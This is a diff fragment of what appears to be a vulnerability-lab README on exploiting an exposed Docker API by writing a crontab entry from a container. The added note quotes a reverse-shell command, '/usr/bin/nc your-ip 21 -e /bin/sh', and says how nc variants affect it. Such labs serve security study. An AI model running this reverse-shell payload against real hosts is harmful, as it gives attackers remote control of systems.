@@ -31,3 +31,6 @@ data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bi
 Reverse shell exploit by injecting commands in crontab:
 
 ![](1.png)
+
+
+**PS.** Attention here, payload above which is writing file to `/etc` volume out of docker container will make exceptions or different behavior because of running in different system。Like [Issue #66](https://github.com/vulhub/vulhub/issues/66), `nc` command in Ubuntu come from the OpenBSD project, it doesn't support `-e` for executing a command after connection. So payload above like `/usr/bin/nc your-ip 21 -e /bin/sh` will haven't a good running in this situation. Plz change it by yourself.
